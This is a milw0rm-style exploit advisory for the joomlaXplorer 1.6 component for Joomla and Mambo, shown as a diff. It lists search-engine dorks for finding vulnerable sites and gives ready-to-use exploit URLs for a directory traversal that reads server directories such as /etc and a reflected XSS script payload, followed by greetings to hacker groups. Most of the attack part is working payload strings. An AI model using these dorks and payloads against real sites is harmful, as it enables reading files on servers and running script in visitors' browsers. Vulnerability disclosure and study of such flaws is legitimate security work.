@@ -1,0 +1,41 @@
+-------------------------------------------------------------
+----- H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo --------
+-------------------------------------------------------------
+
+= Author : HouSSaMix                          
+= Script : Joomla and Mambo Component joomlaxplorer  
+= version : 1.6.0
+= Download : http://joomlacode.org/gf/project/joomlaxplorer
+
+= Dork1 : inurl:index.php?option=com_joomlaxplorer
+= Dork2 : powered by joomlaXplorer
+          			           
+							   
+= BUG 1 :  Local Directory Traversal 
+
+exploit => target.com/path/index.php?option=com_joomlaxplorer&action=show_error&dir=../../[directory]
+
+example :
+  site.com/joomla/index.php?option=com_joomlaxplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc
+  site.com/joomla/index.php?option=com_joomlaxplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+
+= BUG 2 : XSS
+
+exploit => target.com/path/index.php?option=com_joomlaxplorer&action=show_error&dir=hsmx&order=name&srt=yes&error=[XSS]
+ 
+example : www.target.com/path/index.php?option=com_joomlaxplorer&action=show_error&dir=hsmx&order=name&srt=yes&error=%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+       
+
+= greetz :	V4 Team - Jiki Team - Gold_M - HaCkeR_EgY - RoMaNcYxHaCkEr and all muslims Hackers
+
+side note:
+    <name>joomlaXplorer</name>
+    <creationDate>18.09.2007</creationDate>
+    <author>soeren, QuiX Project</author>
+    <copyright>Soeren Eberhardt-Biermann, QuiX Project</copyright>
+    <authorEmail>soeren@virtuemart.net</authorEmail>
+
+    <authorUrl>http://joomlacode.org/gf/project/joomlaxplorer/</authorUrl>
+    <version>1.6.2</version>
+
+# milw0rm.com [2008-04-11]
